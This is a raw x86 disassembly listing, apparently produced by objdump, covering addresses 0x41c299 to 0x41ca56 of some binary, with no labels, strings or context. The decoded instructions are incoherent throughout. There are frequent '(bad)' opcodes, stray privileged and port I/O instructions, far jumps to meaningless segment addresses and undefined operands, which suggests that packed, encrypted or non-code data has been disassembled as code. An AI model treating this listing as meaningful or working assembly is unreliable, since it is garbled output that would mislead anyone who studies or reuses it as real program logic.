  41c299:	rol    DWORD PTR [esi],cl
  41c29b:	popf   
  41c29c:	loop   0x41c24a
  41c29e:	enter  0x8e47,0x15
  41c2a2:	imul   ecx,DWORD PTR [ecx-0x7e98afb6],0x59
  41c2a9:	and    al,0xe8
  41c2ab:	xchg   edi,eax
  41c2ac:	jl     0x41c308
  41c2ae:	jecxz  0x41c241
  41c2b0:	retf   0x12d3
  41c2b3:	sahf   
  41c2b4:	retf   0xeb87
  41c2b7:	cdq    
  41c2b8:	js     0x41c32c
  41c2ba:	cmp    bl,BYTE PTR [edx-0x6f98b9a5]
  41c2c0:	arpl   WORD PTR [edx],bx
  41c2c2:	pop    eax
  41c2c3:	dec    edi
  41c2c4:	icebp  
  41c2c5:	adc    al,0x78
  41c2c7:	jle    0x41c295
  41c2c9:	mov    fs,ebp
  41c2cb:	adc    eax,0x8aa206a7
  41c2d0:	xchg   ebp,eax
  41c2d1:	aam    0x85
  41c2d3:	pop    ds
  41c2d4:	or     al,0xb6
  41c2d6:	les    ebx,FWORD PTR [edx+0x790f823]
  41c2dc:	mov    ebp,0xb74d2f6b
  41c2e1:	data16 jle 0x41c302
  41c2e4:	mov    eax,0xdc799231
  41c2e9:	nop
  41c2ea:	pop    ss
  41c2eb:	pop    eax
  41c2ec:	jg     0x41c32d
  41c2ee:	ficom  DWORD PTR [ebx+0x71]
  41c2f1:	stos   DWORD PTR es:[edi],eax
  41c2f2:	mov    ecx,0x33526e6b
  41c2f7:	pop    eax
  41c2f8:	jmp    0xd7a5:0xe94a6e37
  41c2ff:	inc    esi
  41c300:	out    0x79,al
  41c302:	cmp    eax,0x7cb34b99
  41c307:	cmp    ah,bl
  41c309:	fs ins DWORD PTR es:[edi],dx
  41c30b:	cmc    
  41c30c:	cli    
  41c30d:	inc    ebp
  41c30e:	(bad)  
  41c30f:	retf   0x4f2b
  41c312:	fs cwde 
  41c314:	or     ebp,DWORD PTR [ecx-0x5baad02a]
  41c31a:	and    esi,DWORD PTR [edx+0x41]
  41c31d:	sub    DWORD PTR [edi+0x68123494],eax
  41c323:	sub    al,0x91
  41c325:	and    DWORD PTR [esi+0x66b3df44],ecx
  41c32b:	xchg   esi,eax
  41c32c:	ror    al,cl
  41c32e:	ins    BYTE PTR es:[edi],dx
  41c32f:	ret    0x725b
  41c332:	and    al,0x45
  41c334:	add    dl,0xb3
  41c337:	int    0x38
  41c339:	mov    eax,0x666f2228
  41c33e:	pop    ebp
  41c33f:	test   al,0x37
  41c341:	(bad)  
  41c342:	mov    bh,ah
  41c344:	call   0x59e3:0x2b197635
  41c34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c34c:	leave  
  41c34d:	imul   BYTE PTR [ebx+0x68783787]
  41c353:	call   0x88d1:0xb66da546
  41c35a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c35b:	retf   
  41c35c:	ret    
  41c35d:	sub    esp,eax
  41c35f:	aad    0x27
  41c361:	shl    DWORD PTR [esi-0x344d40c0],1
  41c367:	inc    edx
  41c368:	mov    esi,0xf40faa3d
  41c36d:	retf   
  41c36e:	not    DWORD PTR [eiz*1-0x4ce7fdd2]
  41c375:	and    DWORD PTR [ecx+0x7f2865e],ecx
  41c37b:	dec    ebx
  41c37c:	das    
  41c37d:	adc    BYTE PTR [edx],ch
  41c37f:	into   
  41c380:	mov    ebx,0x21976698
  41c385:	dec    esi
  41c386:	pusha  
  41c387:	sub    DWORD PTR [ebx+0x2f8fe0dd],esi
  41c38d:	xchg   ecx,eax
  41c38e:	push   ebp
  41c38f:	retf   
  41c390:	pop    ecx
  41c391:	cmp    al,ah
  41c393:	stc    
  41c394:	das    
  41c395:	pop    esi
  41c396:	js     0x41c408
  41c398:	jno    0x41c34d
  41c39a:	rol    eax,cl
  41c39c:	xchg   esi,eax
  41c39d:	cdq    
  41c39e:	sub    eax,0x182d2ee1
  41c3a3:	int3   
  41c3a4:	repz xor eax,0x213e6a2e
  41c3aa:	test   eax,0x23362d81
  41c3af:	and    BYTE PTR [ebp+eax*1-0x28da6bcc],bh
  41c3b6:	push   edi
  41c3b7:	push   eax
  41c3b8:	sahf   
  41c3b9:	test   al,0x75
  41c3bb:	or     DWORD PTR [esi-0x49],ebp
  41c3be:	bound  ebp,QWORD PTR [eax-0x719a1f11]
  41c3c4:	sbb    eax,0xb328c244
  41c3c9:	(bad)
  41c3cc:	jmp    0x3281:0x2b31d6a5
  41c3d3:	out    dx,eax
  41c3d4:	ins    BYTE PTR es:[edi],dx
  41c3d5:	fnstcw WORD PTR [edx+0x3c]
  41c3d8:	jb     0x41c3c4
  41c3da:	add    ebx,DWORD PTR [esi-0x30]
  41c3dd:	mov    ecx,esp
  41c3df:	xchg   esp,eax
  41c3e0:	mov    al,ds:0x594ce75b
  41c3e5:	inc    esp
  41c3e6:	call   0x718b3855
  41c3eb:	popaw  
  41c3ed:	inc    ebp
  41c3ee:	jbe    0x41c41f
  41c3f0:	mov    bh,0xdc
  41c3f2:	push   ss
  41c3f3:	(bad)  
  41c3f5:	pop    edi
  41c3f6:	shl    BYTE PTR [edx-0xd3dbed0],0x93
  41c3fd:	lock adc eax,0x47fe3a71
  41c403:	popf   
  41c404:	or     BYTE PTR [ebx-0x29c42713],cl
  41c40a:	mov    dh,0x33
  41c40c:	test   BYTE PTR [eax+esi*4-0x71],dh
  41c410:	pop    ss
  41c411:	fdivr  DWORD PTR [ebx+0x36]
  41c414:	inc    ebp
  41c415:	sub    dh,ah
  41c417:	add    BYTE PTR [edi-0x2f],dh
  41c41a:	sbb    al,0xe9
  41c41c:	inc    edi
  41c41d:	xor    eax,0xf5450922
  41c422:	dec    esi
  41c423:	dec    edi
  41c424:	in     al,dx
  41c425:	mov    edi,0x61efda46
  41c42a:	in     al,dx
  41c42b:	push   edx
  41c42c:	loop   0x41c445
  41c42e:	aad    0xa4
  41c430:	sub    eax,0xb781d0d2
  41c435:	ja     0x41c462
  41c437:	jmp    0x1077:0x36228ab
  41c43e:	push   DWORD PTR [esi-0x64]
  41c441:	adc    al,0x2e
  41c443:	mov    esp,0x371f13d1
  41c448:	cmp    ch,BYTE PTR [esi+0x25]
  41c44b:	cmc    
  41c44c:	mov    esi,0xf41805df
  41c451:	popa   
  41c452:	fs jae 0x41c492
  41c455:	sub    edi,esp
  41c457:	mov    ds:0x2e87408b,al
  41c45c:	push   ebx
  41c45d:	and    al,0x8
  41c45f:	or     ebx,eax
  41c461:	out    0x8a,eax
  41c463:	xlat   BYTE PTR ds:[ebx]
  41c464:	sar    DWORD PTR [ecx+0x9],cl
  41c467:	pop    ecx
  41c468:	int3   
  41c469:	imul   edi,DWORD PTR [eax+edx*1+0x7ba5180c],0xabb01c02
  41c474:	pop    ebp
  41c475:	sbb    BYTE PTR [eax+0x36],dh
  41c478:	push   0xf199e66b
  41c47d:	xor    DWORD PTR [ecx*8-0x3b8ebef5],edi
  41c484:	rcl    BYTE PTR [eax-0x11],1
  41c487:	dec    edx
  41c488:	mov    BYTE PTR [esi],dh
  41c48a:	mov    ecx,0xf3829479
  41c48f:	mov    DWORD PTR [ebx+edi*4-0x3e],ebp
  41c493:	inc    esi
  41c494:	aaa    
  41c495:	cmp    DWORD PTR [esi+eax*2],esp
  41c498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c499:	or     eax,0x5827d1e9
  41c49e:	fs mov edi,0x8284a427
  41c4a4:	jge    0x41c42c
  41c4a6:	dec    ebp
  41c4a7:	fwait
  41c4a8:	xchg   esp,eax
  41c4a9:	adc    ebx,0x6c3bf6d1
  41c4af:	sbb    eax,0xab5d12da
  41c4b4:	pop    ecx
  41c4b5:	popf   
  41c4b6:	xchg   ecx,eax
  41c4b7:	jl     0x41c499
  41c4b9:	lahf   
  41c4ba:	inc    edi
  41c4bb:	mov    ds:0x62d98df6,eax
  41c4c0:	fistp  WORD PTR ds:0xe1160800
  41c4c6:	repnz mov ah,0x26
  41c4c9:	test   ecx,ebx
  41c4cb:	popf   
  41c4cc:	fidivr WORD PTR [edx-0x17]
  41c4cf:	ja     0x41c4fb
  41c4d1:	jmp    0x67f02b1b
  41c4d6:	mov    dl,0xb
  41c4d8:	mov    bl,ah
  41c4da:	aam    0x5
  41c4dc:	mov    bl,BYTE PTR [ecx-0x1a07c751]
  41c4e2:	dec    ecx
  41c4e3:	pop    ecx
  41c4e4:	in     al,0x14
  41c4e6:	fsub   DWORD PTR [edi+0x2ce713e2]
  41c4ec:	xchg   BYTE PTR ds:0x33b35156,al
  41c4f2:	dec    esp
  41c4f3:	and    BYTE PTR ds:[ecx+0x4e86b19f],cl
  41c4fa:	add    al,0xb7
  41c4fc:	inc    edi
  41c4fd:	mov    al,0xfe
  41c4ff:	out    dx,al
  41c500:	mov    eax,0x566f5daa
  41c505:	aaa    
  41c506:	mov    ds:0xadfbfaf7,al
  41c50b:	cmp    eax,0x4f7879bd
  41c510:	out    dx,al
  41c511:	cwde   
  41c512:	ret    0x8f7b
  41c515:	dec    esi
  41c516:	sbb    al,dl
  41c518:	mov    eax,ds:0x888ca233
  41c51d:	pop    ecx
  41c51e:	int    0xdd
  41c520:	sti    
  41c521:	aaa    
  41c522:	ds or  edi,0x8
  41c526:	icebp  
  41c527:	lsl    edi,WORD PTR [edi-0x1698f3eb]
  41c52e:	mov    DWORD PTR [esi-0x70],esi
  41c531:	sbb    dh,BYTE PTR [esi-0x64]
  41c534:	loopne 0x41c4ff
  41c536:	jg     0x41c4f1
  41c538:	add    al,BYTE PTR [ecx-0x5d08560d]
  41c53e:	mov    ebx,0x1c850825
  41c543:	add    bl,BYTE PTR [ecx]
  41c545:	test   BYTE PTR [edi+edx*4],ch
  41c548:	mov    DWORD PTR [ecx],0x16e669ba
  41c54e:	inc    eax
  41c54f:	lods   eax,DWORD PTR ds:[esi]
  41c550:	bound  ebp,QWORD PTR [ecx]
  41c552:	(bad)  
  41c553:	adc    DWORD PTR [ecx+0x5e3833a5],ebp
  41c559:	mov    cl,0x2d
  41c55b:	sbb    eax,0x1f916dd8
  41c560:	mov    DWORD PTR [bx+si],esi
  41c563:	mov    ah,cl
  41c565:	adc    BYTE PTR [edi+0xf86e85],0x78
  41c56c:	out    0x43,al
  41c56e:	sub    DWORD PTR [ecx-0xad0ba8e],edx
  41c574:	inc    ecx
  41c575:	sub    BYTE PTR [edx+0x6c],bh
  41c578:	fsubr  st,st(5)
  41c57a:	adc    dh,BYTE PTR [esi]
  41c57c:	into   
  41c57d:	mov    ?,WORD PTR [ecx+0x1f]
  41c580:	mov    esp,0xad00a3e6
  41c585:	xchg   ebx,edi
  41c587:	aam    0x93
  41c589:	mov    cl,0xac
  41c58b:	push   eax
  41c58c:	sti    
  41c58d:	inc    ebx
  41c58e:	jmp    0xba0:0xba018e51
  41c595:	js     0x41c5fd
  41c597:	pop    ecx
  41c598:	stos   DWORD PTR es:[edi],eax
  41c599:	pusha  
  41c59a:	and    DWORD PTR [ecx],ebp
  41c59c:	inc    ecx
  41c59d:	push   0xffffff85
  41c59f:	or     eax,0x87e5a7de
  41c5a4:	shl    DWORD PTR [ecx+0x37886fca],0x7c
  41c5ab:	ins    BYTE PTR es:[edi],dx
  41c5ac:	xchg   edx,eax
  41c5ad:	mov    ds:0x51ef658c,eax
  41c5b2:	push   0xca23d6a1
  41c5b7:	cmp    BYTE PTR [ecx],ch
  41c5b9:	or     DWORD PTR [ecx+esi*8+0x6a4dd285],esp
  41c5c0:	jle    0x41c597
  41c5c2:	js     0x41c5c2
  41c5c4:	loop   0x41c56e
  41c5c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5c7:	cmp    bh,bh
  41c5c9:	or     DWORD PTR [ecx-0x51a95785],0x46
  41c5d0:	inc    edx
  41c5d1:	pop    eax
  41c5d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5d3:	sar    DWORD PTR [edx],0x90
  41c5d6:	sub    DWORD PTR [eax+ecx*2+0x63657169],edx
  41c5dd:	mov    BYTE PTR fs:[edx-0x68],dl
  41c5e1:	cmp    BYTE PTR [ebp-0x46],0x76
  41c5e5:	cwde   
  41c5e6:	xor    eax,0xac516f86
  41c5eb:	dec    edi
  41c5ec:	or     BYTE PTR ds:0x6dde27dd,ch
  41c5f2:	xor    al,0x10
  41c5f4:	mov    edx,DWORD PTR [edi-0x346d6b7d]
  41c5fa:	clc    
  41c5fb:	leave  
  41c5fc:	sub    DWORD PTR [esi+0x714912da],eax
  41c602:	fst    QWORD PTR ds:0x93e7914a
  41c608:	je     0x41c629
  41c60a:	clc    
  41c60b:	push   edx
  41c60c:	xchg   ebp,eax
  41c60d:	or     DWORD PTR ds:0xeb5449fc,esi
  41c613:	jg     0x41c5db
  41c615:	mul    BYTE PTR [ecx]
  41c617:	lock sub DWORD PTR [ebx],ecx
  41c61a:	and    BYTE PTR [eax+ebx*4],dl
  41c61d:	ss push 0x4d
  41c620:	fsub   st,st(0)
  41c622:	mov    ah,0x57
  41c624:	sahf   
  41c625:	mov    dh,0xf4
  41c627:	and    al,0x69
  41c629:	sbb    ecx,DWORD PTR [edi-0x15]
  41c62c:	fiadd  WORD PTR [ebx+0x69c0feac]
  41c632:	dec    edx
  41c633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c634:	mov    ah,0x59
  41c636:	imul   ecx,DWORD PTR [edi+0x2d0fadb8],0xffffffa7
  41c63d:	js     0x41c6b7
  41c63f:	xor    al,0xe4
  41c641:	sbb    BYTE PTR [ecx+0x46],dl
  41c644:	lahf   
  41c645:	leave  
  41c646:	jnp    0x41c6a1
  41c648:	jecxz  0x41c5f7
  41c64a:	lods   eax,DWORD PTR ds:[esi]
  41c64b:	mov    edx,0x2175ad73
  41c650:	adc    BYTE PTR [ebx],0xc0
  41c653:	shl    DWORD PTR [edi],cl
  41c655:	addr16 (bad) 
  41c657:	pop    ebx
  41c658:	sti    
  41c659:	fisub  WORD PTR [ebp-0x7fac4f30]
  41c65f:	inc    edx
  41c660:	jne    0x41c680
  41c662:	jmp    0x77c7:0xc4641904
  41c669:	popf   
  41c66a:	ins    DWORD PTR es:[edi],dx
  41c66b:	xchg   edx,eax
  41c66c:	mov    ah,0xb1
  41c66e:	shr    BYTE PTR [edx],cl
  41c670:	jbe    0x41c6e9
  41c672:	pop    ebp
  41c673:	cmp    ah,BYTE PTR [esi-0x34d9d819]
  41c679:	jmp    0x79a1:0xb115f906
  41c680:	cdq    
  41c681:	xchg   esi,eax
  41c682:	sbb    BYTE PTR [edx-0x304672c2],ah
  41c688:	mov    ch,0xd4
  41c68a:	cmp    eax,0xc42ef35
  41c68f:	dec    esi
  41c690:	inc    edi
  41c691:	mov    ds:0xa4825836,al
  41c696:	in     eax,dx
  41c697:	mov    BYTE PTR [ecx-0x44bc94f1],cl
  41c69d:	popa   
  41c69e:	lock (bad) 
  41c6a0:	loop   0x41c713
  41c6a2:	lods   al,BYTE PTR ds:[esi]
  41c6a3:	shr    BYTE PTR [edi+0x11ce16f6],0x3
  41c6aa:	xor    BYTE PTR [esi],cl
  41c6ac:	push   esp
  41c6ad:	inc    edx
  41c6ae:	popf   
  41c6af:	inc    ecx
  41c6b0:	sub    eax,0x93625521
  41c6b5:	mov    DWORD PTR [edx-0x6d],esp
  41c6b8:	(bad)  
  41c6b9:	cdq    
  41c6ba:	test   DWORD PTR [edi-0x7863e6bf],esi
  41c6c0:	fwait
  41c6c1:	and    ecx,DWORD PTR [ebx+0x61]
  41c6c4:	push   edi
  41c6c5:	sub    al,0xe5
  41c6c7:	sub    edi,DWORD PTR [eax-0x75]
  41c6ca:	data16 and dl,BYTE PTR [ecx-0x14109313]
  41c6d1:	and    esp,DWORD PTR [esi-0x60]
  41c6d4:	jmp    0xe5ea:0x2b97248b
  41c6db:	aas    
  41c6dc:	scas   eax,DWORD PTR es:[edi]
  41c6dd:	fimul  DWORD PTR [edx+esi*8]
  41c6e0:	sahf   
  41c6e1:	push   esp
  41c6e2:	add    eax,0xac83a032
  41c6e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6e8:	and    eax,0x587dfd81
  41c6ed:	bound  esp,QWORD PTR [eax+0x14]
  41c6f0:	dec    ebx
  41c6f1:	add    eax,0x3bdcedea
  41c6f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6f7:	push   0x76dd49f5
  41c6fc:	out    0x54,eax
  41c6fe:	(bad)  
  41c6ff:	jne    0x41c682
  41c701:	mul    BYTE PTR [esi]
  41c703:	fcomp  DWORD PTR [ebx+0x2c19492e]
  41c709:	dec    esp
  41c70a:	inc    edi
  41c70b:	rol    DWORD PTR [edx],1
  41c70d:	dec    ebp
  41c70e:	xchg   DWORD PTR [ecx+0x18],eax
  41c711:	imul   edi,DWORD PTR [ebp-0x62365e8e],0xc0d37caa
  41c71b:	sbb    al,0x29
  41c71d:	mov    BYTE PTR [esi+0x66823ddc],0x81
  41c724:	sbb    ebx,DWORD PTR [edx-0x2ff81c3c]
  41c72a:	pop    esi
  41c72b:	mov    edx,0x9f6bd627
  41c730:	loopne 0x41c773
  41c732:	or     al,0x1f
  41c734:	cmp    BYTE PTR [ebp+0x7a],al
  41c737:	bound  ecx,QWORD PTR [esi+0x4f]
  41c73a:	add    BYTE PTR [esi-0x458e4e1c],ah
  41c740:	loope  0x41c7c1
  41c742:	(bad)  
  41c743:	les    ebx,FWORD PTR [eax+0x19]
  41c746:	les    eax,FWORD PTR [edx+esi*4]
  41c749:	mov    ecx,0xd6af78e4
  41c74e:	cmp    eax,0x5d57b08b
  41c753:	icebp  
  41c754:	ror    BYTE PTR ds:0x1196abc9,0xd4
  41c75b:	mov    ebx,0xa7bf48a5
  41c760:	scas   eax,DWORD PTR es:[edi]
  41c761:	sub    eax,0xb45ebc5e
  41c766:	xchg   esp,eax
  41c767:	mov    esi,0x97c45fe2
  41c76c:	repz shr BYTE PTR [ebx+edi*4+0x5f049572],cl
  41c774:	mov    al,0x4a
  41c776:	xor    ch,0x68
  41c779:	lea    ebp,[ebp-0x2180bded]
  41c77f:	cli    
  41c780:	adc    BYTE PTR [ecx+eiz*1],ah
  41c783:	add    al,BYTE PTR [ecx]
  41c785:	push   esi
  41c786:	ins    DWORD PTR es:[edi],dx
  41c787:	pop    esp
  41c788:	jmp    0x41c7c0
  41c78a:	enter  0xce67,0x14
  41c78e:	out    dx,eax
  41c78f:	cmp    cl,BYTE PTR [eax]
  41c791:	enter  0x92c5,0x80
  41c795:	xchg   ecx,eax
  41c796:	aas    
  41c797:	pmaxub mm2,QWORD PTR [edx+0x37b5c96e]
  41c79e:	ret    
  41c79f:	pusha  
  41c7a0:	fisubr DWORD PTR [edx+0x34d5c437]
  41c7a6:	sar    BYTE PTR [ebx-0x46],1
  41c7a9:	ja     0x41c7d2
  41c7ab:	jne    0x41c780
  41c7ad:	mov    fs,WORD PTR [ecx+0x11]
  41c7b0:	fwait
  41c7b1:	mov    WORD PTR [ebx+0x2c],es
  41c7b4:	push   esi
  41c7b5:	jecxz  0x41c782
  41c7b7:	xchg   esp,eax
  41c7b8:	xor    dh,cl
  41c7ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7bb:	jns    0x41c7ed
  41c7bd:	ja     0x41c7bc
  41c7bf:	addr16 adc eax,0x4a294c04
  41c7c5:	jnp    0x41c7fd
  41c7c7:	bound  esi,QWORD PTR [edx]
  41c7c9:	xor    DWORD PTR [edx+0x42104c1f],0xffffffdb
  41c7d0:	or     al,0x77
  41c7d2:	push   cs
  41c7d3:	jmp    0x6ac3:0x33354466
  41c7da:	out    0x85,al
  41c7dc:	push   esi
  41c7dd:	sub    al,0x2d
  41c7df:	out    0xae,al
  41c7e1:	test   eax,0xd420b038
  41c7e6:	mov    bh,0x1
  41c7e8:	inc    edx
  41c7e9:	mov    ds:0xa9a7702c,al
  41c7ee:	pop    ecx
  41c7ef:	int3   
  41c7f0:	push   eax
  41c7f1:	mov    edi,0xd7fcbb09
  41c7f6:	out    0xc6,eax
  41c7f8:	sub    al,ah
  41c7fa:	(bad)  
  41c7fb:	lods   eax,DWORD PTR ds:[esi]
  41c7fc:	test   DWORD PTR ds:0xd5494fa7,0x2496657
  41c806:	cs mov dl,0xb4
  41c809:	dec    esi
  41c80a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c80b:	dec    eax
  41c80c:	or     al,0x8f
  41c80e:	cdq    
  41c80f:	mov    edx,0x3185dde9
  41c814:	adc    BYTE PTR [esi],0x6e
  41c817:	stos   BYTE PTR es:[edi],al
  41c818:	packuswb mm6,QWORD PTR [esi]
  41c81b:	fnstsw WORD PTR [edx-0x6d]
  41c81e:	mov    eax,ebp
  41c820:	jg     0x41c7f7
  41c822:	mov    esp,0xfb5c7e20
  41c827:	outs   dx,DWORD PTR ds:[esi]
  41c828:	test   al,0x37
  41c82a:	aad    0x34
  41c82c:	sti    
  41c82d:	retf   
  41c82e:	retw   0x9332
  41c832:	fs stos BYTE PTR es:[edi],al
  41c834:	mov    dh,0x26
  41c836:	and    al,0xbe
  41c838:	out    dx,eax
  41c839:	ins    DWORD PTR es:[edi],dx
  41c83a:	push   esi
  41c83b:	psubusb mm5,mm2
  41c83e:	inc    edi
  41c83f:	and    ebx,DWORD PTR [ebx-0x1e]
  41c842:	mov    bh,0x6c
  41c844:	cmp    DWORD PTR [esi+0x6284703f],0x90c87540
  41c84e:	hlt    
  41c84f:	and    eax,0x22f1be1e
  41c854:	push   ebx
  41c855:	sbb    eax,DWORD PTR [esi+0x464baf88]
  41c85b:	pop    ecx
  41c85c:	mov    edi,0x2ae42218
  41c861:	dec    esi
  41c862:	(bad)  
  41c864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c865:	xor    BYTE PTR [esi+0x50],ch
  41c868:	push   cs
  41c869:	leave  
  41c86a:	pop    ebx
  41c86b:	nop
  41c86c:	rcl    esi,0x70
  41c86f:	sbb    al,0xf
  41c871:	neg    ch
  41c873:	jb     0x41c83f
  41c875:	loope  0x41c847
  41c877:	imul   ebp,DWORD PTR [edi],0x1b32b7ba
  41c87d:	sub    eax,esi
  41c87f:	inc    esp
  41c880:	xor    al,0x49
  41c882:	jp     0x41c857
  41c884:	jo     0x41c82b
  41c886:	int    0xe
  41c888:	sbb    al,0xcf
  41c88a:	dec    ebp
  41c88b:	cwde   
  41c88c:	push   esi
  41c88d:	imul   esp,DWORD PTR [esi],0x700eb626
  41c893:	mov    ebp,0xd1c14b39
  41c898:	jns    0x41c846
  41c89a:	add    ebp,DWORD PTR [esi+eiz*2]
  41c89d:	pop    edx
  41c89e:	out    0x5e,eax
  41c8a0:	pmaxub mm5,mm1
  41c8a3:	out    dx,eax
  41c8a4:	(bad)  
  41c8a5:	mov    dl,0x11
  41c8a7:	hlt    
  41c8a8:	out    dx,al
  41c8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8aa:	pop    ds
  41c8ab:	cmp    al,0x1d
  41c8ad:	dec    edi
  41c8ae:	lahf   
  41c8af:	sahf   
  41c8b0:	sub    eax,0xc6141d92
  41c8b5:	add    al,0x54
  41c8b7:	pop    edx
  41c8b8:	cmp    eax,0x12565031
  41c8bd:	mov    al,0x63
  41c8bf:	push   edi
  41c8c0:	push   eax
  41c8c1:	fbstp  TBYTE PTR [edx+0x570dd970]
  41c8c7:	enter  0x12a4,0x4a
  41c8cb:	push   es
  41c8cc:	mov    bh,0x61
  41c8ce:	ja     0x41c88f
  41c8d0:	stc    
  41c8d1:	or     al,0x22
  41c8d3:	pop    edx
  41c8d4:	jnp    0x41c8dd
  41c8d6:	mov    al,0xb
  41c8d8:	aam    0x70
  41c8da:	push   esp
  41c8db:	adc    eax,eax
  41c8dd:	adc    BYTE PTR [edi-0x17a16b90],0x10
  41c8e4:	mov    dh,BYTE PTR [ebx-0x3e740cc]
  41c8ea:	arpl   WORD PTR [eax-0x780d1934],dx
  41c8f0:	in     al,dx
  41c8f1:	push   edx
  41c8f2:	cwde   
  41c8f3:	imul   eax,DWORD PTR [ebx-0x65],0x54
  41c8f7:	es and al,0x77
  41c8fa:	xor    ebp,0x30
  41c8fd:	add    ecx,esp
  41c8ff:	mov    ebx,0xba0344bf
  41c904:	xor    esi,edx
  41c906:	pop    ebp
  41c907:	mov    ecx,0xf6436abe
  41c90c:	jp     0x41c93c
  41c90e:	pop    edx
  41c90f:	mov    edx,0xde4bdc38
  41c914:	test   al,0x87
  41c916:	and    al,0x8
  41c918:	call   DWORD PTR [si]
  41c91b:	xchg   edi,eax
  41c91c:	addr16 dec ebp
  41c91e:	popa   
  41c91f:	lods   eax,DWORD PTR ds:[esi]
  41c920:	xchg   esi,eax
  41c921:	fidivr WORD PTR [edx]
  41c923:	fcomp  QWORD PTR [ebp-0x6c09bd]
  41c929:	in     eax,0xc2
  41c92b:	sub    DWORD PTR [ebx+0x5e],0xeb5c10c9
  41c932:	sub    al,0x13
  41c934:	sbb    al,0xb5
  41c936:	jbe    0x41c923
  41c938:	sar    BYTE PTR [ebp-0x20],0x7c
  41c93c:	sahf   
  41c93d:	fisub  DWORD PTR [edx+0x34e27858]
  41c943:	sahf   
  41c944:	enter  0x2016,0x38
  41c948:	lock adc cl,BYTE PTR [ebp+0x76804181]
  41c94f:	fild   QWORD PTR [ebx]
  41c951:	xchg   DWORD PTR [eax+0x27],ecx
  41c954:	mov    ah,bl
  41c956:	xchg   ebp,eax
  41c957:	int    0xa2
  41c959:	sub    al,0x86
  41c95b:	jo     0x41c98a
  41c95d:	outs   dx,BYTE PTR ds:[esi]
  41c95e:	loope  0x41c970
  41c960:	and    edi,esi
  41c962:	aaa    
  41c963:	add    DWORD PTR [ecx-0x39],esi
  41c966:	mov    edx,0xf567323d
  41c96b:	sbb    al,BYTE PTR [ecx]
  41c96d:	xchg   ebx,eax
  41c96e:	dec    edx
  41c96f:	loopne 0x41c9ec
  41c971:	outs   dx,BYTE PTR ds:[esi]
  41c972:	je     0x41c9ea
  41c974:	fisttp DWORD PTR [edi-0x75]
  41c977:	(bad)  
  41c978:	mov    edx,0x341a2aeb
  41c97d:	rol    DWORD PTR [ecx],1
  41c97f:	sub    ecx,DWORD PTR [ebx+0x1c]
  41c982:	pop    ss
  41c983:	adc    eax,0xff3abbd6
  41c988:	inc    edx
  41c989:	mov    ah,0x7c
  41c98b:	sti    
  41c98c:	lea    esi,[edx-0x3cedf5d8]
  41c992:	ficomp WORD PTR [edx]
  41c994:	aad    0x58
  41c996:	adc    DWORD PTR [edx],esi
  41c998:	leave  
  41c999:	out    dx,al
  41c99a:	jp     0x41ca02
  41c99c:	fmul   DWORD PTR [edx+0x52]
  41c99f:	int    0x31
  41c9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9a2:	(bad)  
  41c9a4:	pusha  
  41c9a5:	in     al,dx
  41c9a6:	inc    edx
  41c9a7:	sub    eax,0xf327b3a4
  41c9ac:	mov    ebx,0xb49705f6
  41c9b1:	bound  edx,QWORD PTR ds:0x91f984cf
  41c9b7:	mov    ebx,0xe2c6b45a
  41c9bc:	loope  0x41c9a9
  41c9be:	fisubr DWORD PTR [esi]
  41c9c0:	sub    al,0x77
  41c9c2:	cmc    
  41c9c3:	out    dx,eax
  41c9c4:	in     eax,0xad
  41c9c6:	into   
  41c9c7:	push   eax
  41c9c8:	cli    
  41c9c9:	enter  0x6507,0x87
  41c9cd:	mov    ?,WORD PTR [esi]
  41c9cf:	push   ecx
  41c9d0:	je     0x41c9b7
  41c9d2:	lea    ecx,[ecx]
  41c9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9d5:	xchg   sp,ax
  41c9d7:	inc    bh
  41c9d9:	and    eax,0xee24f2b2
  41c9de:	cli    
  41c9df:	xor    al,0x77
  41c9e1:	outs   dx,DWORD PTR ds:[esi]
  41c9e2:	cmp    al,BYTE PTR [ebp+ebx*1+0x2d]
  41c9e6:	je     0x41c996
  41c9e8:	loop   0x41c9c5
  41c9ea:	jmp    0x92bf:0x5b303eb8
  41c9f1:	jge    0x41c987
  41c9f3:	push   ss
  41c9f4:	sbb    eax,0xa5803e01
  41c9f9:	fdiv   QWORD PTR [edi+0x6a]
  41c9fc:	retf   0xe39e
  41c9ff:	cli    
  41ca00:	pop    eax
  41ca01:	add    al,0x44
  41ca03:	xlat   BYTE PTR ds:[ebx]
  41ca04:	pop    edx
  41ca05:	leave  
  41ca06:	push   edx
  41ca07:	lds    esi,FWORD PTR [edi+0x7f60c39c]
  41ca0d:	xchg   esi,eax
  41ca0e:	std    
  41ca0f:	pushf  
  41ca10:	jnp    0x41ca12
  41ca12:	sahf   
  41ca13:	iret   
  41ca14:	ror    BYTE PTR cs:[edi+esi*4-0x2c5e8bf8],1
  41ca1c:	daa    
  41ca1d:	push   cs
  41ca1e:	push   eax
  41ca1f:	outs   dx,DWORD PTR ds:[esi]
  41ca20:	mov    bh,0xdc
  41ca22:	push   cs
  41ca23:	mov    edi,0xa70a68a0
  41ca28:	jp     0x41c9aa
  41ca2a:	push   cs
  41ca2b:	call   0xc13d:0xe9ea18e8
  41ca32:	stc    
  41ca33:	sbb    DWORD PTR [ecx-0x53],0xffffffb0
  41ca37:	and    BYTE PTR [edi+0x6e],bl
  41ca3a:	call   0xeaed:0x9c246e45
  41ca41:	or     BYTE PTR [esi],ch
  41ca43:	cld    
  41ca44:	dec    ecx
  41ca45:	pop    esi
  41ca46:	dec    ecx
  41ca47:	call   0x80d4c3c
  41ca4c:	push   edi
  41ca4d:	add    ebx,DWORD PTR [ebx+0x63676878]
  41ca53:	dec    edx
  41ca54:	in     al,0xae
  41ca56:	push   cs
